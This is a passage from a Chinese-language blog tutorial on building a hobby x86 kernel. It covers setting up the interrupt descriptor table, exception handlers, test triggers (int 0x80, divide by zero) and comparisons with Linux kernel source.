Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;    Coprocessor Segment Overrun (reserved)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#TS Invalid TSS\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#NP Segment Not Present\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#SS Stack-Segment Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#GP General Protection\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#PF Page Fault\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--  (Intel reserved. Do not use.)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#MF x87 FPU Floating-Point Error (Math Fault)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#AC Alignment Check\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#MC Machine Check\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#XF SIMD Floating-Point Exception\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#VE Virtualization Exception\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#CP Control Protection Exception\0&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exception_handler</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *message = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vector</span> &lt; <span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="built_in">vector</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        message = messages[<span class="number">15</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;\nEXCEPTION : %s \n&quot;</span>, messages[<span class="built_in">vector</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化中断描述符，和中断处理函数数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ENTRY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">gate_t</span> *gate = &amp;idt[i];</span><br><span class="line">        <span class="type">handler_t</span> handler = handler_entry_table[i];</span><br><span class="line"></span><br><span class="line">        gate-&gt;offset0 = (u32)handler &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;offset1 = ((u32)handler &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>; <span class="comment">// 代码段</span></span><br><span class="line">        gate-&gt;reserved = <span class="number">0</span>;      <span class="comment">// 保留不用</span></span><br><span class="line">        gate-&gt;type = <span class="number">0b1110</span>;     <span class="comment">// 中断门</span></span><br><span class="line">        gate-&gt;segment = <span class="number">0</span>;       <span class="comment">// 系统段</span></span><br><span class="line">        gate-&gt;DPL = <span class="number">0</span>;           <span class="comment">// 内核态</span></span><br><span class="line">        gate-&gt;present = <span class="number">1</span>;       <span class="comment">// 有效</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        handler_table[i] = exception_handler;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    idt_ptr.base = (u32)idt;</span><br><span class="line">    idt_ptr.limit = <span class="keyword">sizeof</span>(idt) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lidt idt_ptr\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在start.asm中写一个int 0x80超出范围调用</p><p><code>src/kernel/start.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">extern kernel_init</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    call kernel_init</span><br><span class="line">    int 0x80</span><br><span class="line">    jmp $</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d61f6f2b0d54d1429da0edfcc376aac5.png" alt="image-20220314212759582" /></p><p>可以看到已经把参数都压进去了，根据判断启动了第13号默认调用</p><p><img src="https://img.joe1sn.top/uploads/big/32aa2c1f20bafed28c55757c5da70574.png" alt="image-20220314213017271" /></p><p><img src="https://img.joe1sn.top/uploads/big/ff2e0e611fa88a5dc96f16007f933c93.png" alt="image-20220314213116695" /></p><p><img src="https://img.joe1sn.top/uploads/big/be45a1f909c507fc453ea7dfc490d92b.png" alt="image-20220314213058124" /></p><p>再是一个除0异常</p><p><code>src/kernel/start.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">extern kernel_init</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    call kernel_init</span><br><span class="line">    mov bx, 0</span><br><span class="line">    div bx</span><br><span class="line">    jmp $</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4233edd16d77b2a55e09fbf4b10d4169.png" alt="image-20220314213325088" /></p><p><strong>异常列表</strong></p><table><thead><tr><th>编号</th><th>名称</th><th>类型</th><th>助记符</th><th>错误码</th></tr></thead><tbody><tr><td>0 (0x0)</td><td>除零错误</td><td>故障</td><td>#DE</td><td>无</td></tr><tr><td>1 (0x1)</td><td>调试</td><td>故障/陷阱</td><td>#DB</td><td>无</td></tr><tr><td>2 (0x2)</td><td>不可屏蔽中断</td><td>中断</td><td>-</td><td>无</td></tr><tr><td>3 (0x3)</td><td>断点</td><td>陷阱</td><td>#BP</td><td>无</td></tr><tr><td>4 (0x4)</td><td>溢出</td><td>陷阱</td><td>#OF</td><td>无</td></tr><tr><td>5 (0x5)</td><td>越界</td><td>故障</td><td>#BR</td><td>无</td></tr><tr><td>6 (0x6)</td><td>指令无效</td><td>故障</td><td>#UD</td><td>无</td></tr><tr><td>7 (0x7)</td><td>设备不可用</td><td>故障</td><td>#NM</td><td>无</td></tr><tr><td>8 (0x8)</td><td>双重错误</td><td>终止</td><td>#DF</td><td>有 (Zero)</td></tr><tr><td>9 (0x9)</td><td>协处理器段超限</td><td>故障</td><td>-</td><td>无</td></tr><tr><td>10 (0xA)</td><td>无效任务状态段</td><td>故障</td><td>#TS</td><td>有</td></tr><tr><td>11 (0xB)</td><td>段无效</td><td>故障</td><td>#NP</td><td>有</td></tr><tr><td>12 (0xC)</td><td>栈段错误</td><td>故障</td><td>#SS</td><td>有</td></tr><tr><td>13 (0xD)</td><td>一般性保护异常</td><td>故障</td><td>#GP</td><td>有</td></tr><tr><td>14 (0xE)</td><td>缺页错误</td><td>故障</td><td>#PF</td><td>有</td></tr><tr><td>15 (0xF)</td><td>保留</td><td>-</td><td>-</td><td>无</td></tr><tr><td>16 (0x10)</td><td>浮点异常</td><td>故障</td><td>#MF</td><td>无</td></tr><tr><td>17 (0x11)</td><td>对齐检测</td><td>故障</td><td>#AC</td><td>有</td></tr><tr><td>18 (0x12)</td><td>机器检测</td><td>终止</td><td>#MC</td><td>无</td></tr><tr><td>19 (0x13)</td><td>SIMD 浮点异常</td><td>故障</td><td>#XM/#XF</td><td>无</td></tr><tr><td>20 (0x14)</td><td>虚拟化异常</td><td>故障</td><td>#VE</td><td>无</td></tr><tr><td>21 (0x15)</td><td>控制保护异常</td><td>故障</td><td>#CP</td><td>有</td></tr><tr><td>22-31 (0x16-0x1f)</td><td>保留</td><td>-</td><td>-</td><td>无</td></tr></tbody></table><h2 id="linux是怎样做到的"><a class="markdownIt-Anchor" href="#linux是怎样做到的"></a> Linux是怎样做到的</h2><p>官方说明：<a href="https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html">https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html</a></p><blockquote><p>Below we can find Linux IRQ vector layout. The first 32 entries are reserved for exceptions, vector 128 is used for syscall interface and the rest are used mostly for hardware interrupts handlers.</p></blockquote><p>这是linux对不同中断编号的分类</p><p><img src="https://img.joe1sn.top/uploads/big/482dba65579a57ea5dcc2524e812806e.png" alt="" /></p><p>在复习下之前的<a href="https://blog.joe1sn.top/2022/03/10/os-interrupt/"><strong>操作系统实现-系统中断</strong></a>的内容，我们在这篇博客里面是实现的<strong>异常处理</strong>，再Linux上对应的编号是0~31</p><p><a href="https://elixir.bootlin.com/linux/v5.16.14/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include/asm">asm</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include/asm/irq_vectors.h">irq_vectors.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_IRQ_VECTORS_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_IRQ_VECTORS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/threads.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Linux IRQ vector layout.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are 256 IDT entries (per CPU - each entry is 8 bytes) which can</span></span><br><span class="line"><span class="comment"> * be defined by Linux. They are used as a jump table by the CPU when a</span></span><br><span class="line"><span class="comment"> * given vector is triggered - by a CPU-external, CPU-internal or</span></span><br><span class="line"><span class="comment"> * software-triggered event.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Linux sets the kernel code address each entry jumps to early during</span></span><br><span class="line"><span class="comment"> * bootup, and never changes them. This is the general layout of the</span></span><br><span class="line"><span class="comment"> * IDT entries:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Vectors   0 ...  31 : system traps and exceptions - hardcoded events</span></span><br><span class="line"><span class="comment"> *  Vectors  32 ... 127 : device interrupts</span></span><br><span class="line"><span class="comment"> *  Vector  128         : legacy int80 syscall interface</span></span><br><span class="line"><span class="comment"> *  Vectors 129 ... LOCAL_TIMER_VECTOR-1</span></span><br><span class="line"><span class="comment"> *  Vectors LOCAL_TIMER_VECTOR ... 255 : special interrupts</span></span><br><span class="line"><span class="comment">.....</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is used as an interrupt vector when programming the APIC. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NMI_VECTOR0x02</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IDT vectors usable for external interrupt sources start at 0x20.</span></span><br><span class="line"><span class="comment"> * (0x80 is the syscall vector, 0x30-0x3f are for ISA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_EXTERNAL_VECTOR0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reserve the lowest usable vector (and hence lowest priority)  0x20 for</span></span><br><span class="line"><span class="comment"> * triggering cleanup after irq migration. 0x21-0x2f will still be used</span></span><br><span class="line"><span class="comment"> * for device interrupts.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ_MOVE_CLEANUP_VECTORFIRST_EXTERNAL_VECTOR</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IA32_SYSCALL_VECTOR0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Vectors 0x30-0x3f are used for ISA interrupts.</span></span><br><span class="line"><span class="comment"> *   round up to the next 16-vector boundary</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ISA_IRQ_VECTOR(irq)(((FIRST_EXTERNAL_VECTOR + 16) &amp; ~15) + irq)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Special IRQ vectors used by the SMP architecture, 0xf0-0xff</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  some of the following vectors are &#x27;rare&#x27;, they are merged</span></span><br><span class="line"><span class="comment"> *  into a single vector (CALL_FUNCTION_VECTOR) to save vector space.</span></span><br><span class="line"><span class="comment"> *  TLB, reschedule and local APIC vectors are performance-critical.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPURIOUS_APIC_VECTOR0xff</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Sanity check</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ((SPURIOUS_APIC_VECTOR &amp; 0x0F) != 0x0F)</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> SPURIOUS_APIC_VECTOR definition <span class="keyword">error</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_APIC_VECTOR0xfe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESCHEDULE_VECTOR0xfd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_FUNCTION_VECTOR0xfc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_FUNCTION_SINGLE_VECTOR0xfb</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THERMAL_APIC_VECTOR0xfa</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THRESHOLD_APIC_VECTOR0xf9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REBOOT_VECTOR0xf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generic system vector for platform specific use</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> X86_PLATFORM_IPI_VECTOR0xf7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IRQ work vector:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Size the maximum number of interrupts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If the irq_desc[] array has a sparse layout, we can size things</span></span><br><span class="line"><span class="comment"> * generously - it scales up linearly with the maximum number of CPUs,</span></span><br><span class="line"><span class="comment"> * and the maximum number of IO-APICs, whichever is higher.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In other cases we size more conservatively, to not create too large</span></span><br><span class="line"><span class="comment"> * static arrays.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_IRQS_LEGACY16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CPU_VECTOR_LIMIT(64 * NR_CPUS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IO_APIC_VECTOR_LIMIT(32 * MAX_IO_APICS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_X86_IO_APIC) &amp;&amp; defined(CONFIG_PCI_MSI)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_IRQS\</span></span><br><span class="line"><span class="meta">(CPU_VECTOR_LIMIT &gt; IO_APIC_VECTOR_LIMIT ?\</span></span><br><span class="line"><span class="meta">(NR_VECTORS + CPU_VECTOR_LIMIT)  :\</span></span><br><span class="line"><span class="meta">(NR_VECTORS + IO_APIC_VECTOR_LIMIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_X86_IO_APIC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>NR_IRQS(NR_VECTORS + IO_APIC_VECTOR_LIMIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_PCI_MSI)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_IRQS(NR_VECTORS + CPU_VECTOR_LIMIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_IRQSNR_IRQS_LEGACY</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_IRQ_VECTORS_H */</span></span></span><br></pre></td></tr></table></figure><p>接着就是三种门：</p><blockquote><p>On x86 an IDT entry has 8 bytes and it is named gate. There can be 3 types of gates:</p><ul><li>interrupt gate, holds the address of an interrupt or exception handler. Jumping to the handler disables maskable interrupts (IF flag is cleared).</li><li>trap gates, similar to an interrupt gate but it does not disable maskable interrupts while jumping to interrupt/exception handler.</li><li>task gates (not used in Linux)</li></ul></blockquote><p>这个gate就是中断描述符的结构体，具体门的有三种：中断门、陷阱门、任务门(没有再Linux上使用)</p><p>同时文档也向我们说明了IDT_Entry（即：门）的属性</p><blockquote><p>Let’s have a look at several fields of an IDT entry:</p><ul><li>segment selector, index into GDT/LDT to find the start of the code segment where the interrupt handlers reside</li><li>offset, offset inside the code segment</li><li>T, represents the type of gate</li><li>DPL, minimum privilege required for using the segments content.</li></ul></blockquote><ol><li>要有一个段选择子，能够将从全局描述符表和和中断描述符表找到对应的内存和中断函数(imnterrupt handlers)</li><li>在代码段中的偏移</li><li>门类型的代表</li><li>使用该段信息的最小权限值</li></ol><p><img src="https://img.joe1sn.top/uploads/big/e00e9dfd5f5950e16fa7b160e7784454.png" alt="" /></p><p>所以我们写除了代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">gate_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u16 offset0;    <span class="comment">// 段内偏移 0 ~ 15 位</span></span><br><span class="line">    u16 selector;   <span class="comment">// 代码段选择子</span></span><br><span class="line">    u8 reserved;    <span class="comment">// 保留不用</span></span><br><span class="line">    u8 type : <span class="number">4</span>;    <span class="comment">// 任务门/中断门/陷阱门</span></span><br><span class="line">    u8 segment : <span class="number">1</span>; <span class="comment">// segment = 0 表示系统段</span></span><br><span class="line">    u8 DPL : <span class="number">2</span>;     <span class="comment">// 使用 int 指令访问的最低权限</span></span><br><span class="line">    u8 present : <span class="number">1</span>; <span class="comment">// 是否有效</span></span><br><span class="line">    u16 offset1;    <span class="comment">// 段内偏移 16 ~ 31 位</span></span><br><span class="line">&#125; _packed <span class="type">gate_t</span>;</span><br></pre></td></tr></table></figure><p>同时的Linux实现：</p><p><a href="https://elixir.bootlin.com/linux/v5.16.14/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include/asm">asm</a>/<a href="https://elixir.bootlin.com/linux/v5.16.14/source/arch/x86/include/asm/desc_defs.h#L84">desc_defs.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gate_struct</span> &#123;</span></span><br><span class="line">u16offset_low;</span><br><span class="line">u16segment;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_bits</span><span class="title">bits</span>;</span></span><br><span class="line">u16offset_middle;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">u32offset_high;</span><br><span class="line">u32reserved;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>从上面得知我们需要对gate有初始化</p><p>所以写了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ENTRY_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">gate_t</span> *gate = &amp;idt[i];</span><br><span class="line">        <span class="type">handler_t</span> handler = handler_entry_table[i];</span><br><span class="line"></span><br><span class="line">        gate-&gt;offset0 = (u32)handler &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;offset1 = ((u32)handler &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>; <span class="comment">// 代码段</span></span><br><span class="line">        gate-&gt;reserved = <span class="number">0</span>;      <span class="comment">// 保留不用</span></span><br><span class="line">        gate-&gt;type = <span class="number">0b1110</span>;     <span class="comment">// 中断门</span></span><br><span class="line">        gate-&gt;segment = <span class="number">0</span>;       <span class="comment">// 系统段</span></span><br><span class="line">        gate-&gt;DPL = <span class="number">0</span>;           <span class="comment">// 内核态</span></span><br><span class="line">        gate-&gt;present = <span class="number">1</span>;       <span class="comment">// 有效</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        handler_table[i] = exception_handler;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    idt_ptr.base = (u32)idt;</span><br><span class="line">    idt_ptr.limit = <span class="keyword">sizeof</span>(idt) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lidt idt_ptr\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的Linux中有：（这也只是其中一种）</p><p><a href="https://elixir.bootlin.com/linux/v5.17-rc7/source">/</a><a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86/boot">boot</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86/boot/compressed">compressed</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86/boot/compressed/idt_64.c">idt_64.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_idt_entry</span><span class="params">(<span class="type">int</span> <span class="built_in">vector</span>, <span class="type">void</span> (*handler)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> address = (<span class="type">unsigned</span> <span class="type">long</span>)handler;</span><br><span class="line">gate_desc entry;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;entry, <span class="number">0</span>, <span class="keyword">sizeof</span>(entry));</span><br><span class="line"></span><br><span class="line">entry.offset_low    = (u16)(address &amp; <span class="number">0xffff</span>);</span><br><span class="line">entry.segment       = __KERNEL_CS;</span><br><span class="line">entry.bits.type     = GATE_TRAP;</span><br><span class="line">entry.bits.p        = <span class="number">1</span>;</span><br><span class="line">entry.offset_middle = (u16)((address &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">entry.offset_high   = (u32)(address &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;boot_idt[<span class="built_in">vector</span>], &amp;entry, <span class="keyword">sizeof</span>(entry));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要一个函数来帮助gate的段选择子找到相对应的系统调用号，这个函数被称为<code>interrupt_handler</code></p><p><img src="https://img.joe1sn.top/uploads/big/df087a902cbe021c21afdd2d752d7fb4.png" alt="" 